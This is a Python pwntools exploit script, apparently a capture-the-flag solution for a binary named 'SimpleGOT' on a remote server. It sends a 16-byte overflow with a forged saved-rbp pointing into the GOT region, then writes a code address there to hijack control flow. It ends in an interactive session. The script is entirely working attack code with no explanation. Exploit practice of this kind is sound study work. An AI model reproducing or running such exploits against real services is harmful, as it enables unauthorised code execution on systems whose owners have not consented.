#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

local = False
elf = 'SimpleGOT' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "140.114.77.172"
    port = 10001
    r = remote(ip,port)

context.arch = 'amd64'

myrbp = 0x601018 + 16
addr = 0x0000000000400686
payload1 = 'a' * 16 + p64(myrbp)
payload2 =  p64(addr)
raw_input('aa')
print payload1
print payload2

r.send(payload1)
r.send(payload2)
r.interactive()
